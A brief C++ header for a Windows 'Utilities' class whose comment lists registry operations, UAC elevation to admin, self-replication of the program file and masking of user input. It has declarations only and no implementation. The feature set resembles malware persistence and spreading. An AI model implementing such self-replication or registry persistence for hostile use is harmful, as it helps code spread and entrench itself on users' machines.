/*contains functions for winAPI registry operations 
 *contains functions for elevating UAC to admin level
 *contains functions for program file self replication 
 *contains function for masking user input
 */
#ifndef UTILITIES_H
#define UTILITIES_H

#include <windows.h>  

namespace kosmaz
{
class Utilities
{
 public:
	 	bool Am_I_Registered(PCWSTR pszAppName);
 		char* Replicate_Self();
		bool Write_To_Registry();
 		char* hide_user_input();
};
}
#endif  //UTILITIES
